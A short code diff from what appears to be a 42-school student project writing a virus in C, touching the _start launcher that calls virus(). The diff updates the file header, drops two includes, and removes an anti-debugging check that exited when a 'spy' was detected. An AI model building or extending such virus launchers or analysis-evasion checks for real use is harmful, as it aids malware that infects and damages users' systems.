@@ -6,14 +6,12 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2020/02/22 23:16:19 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/06/20 14:52:36 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "syscall.h"
-#include "utils.h"
 #include "virus.h"
-#include "loader.h"
 
 /*
 ** _start is the launcher function of the virus
@@ -23,9 +21,6 @@
 
 void	_start(void)
 {
-	if (detect_spy())
-		sys_exit(putstr("spy detected!\n"));
-
 	virus();
 
 	sys_exit(0);
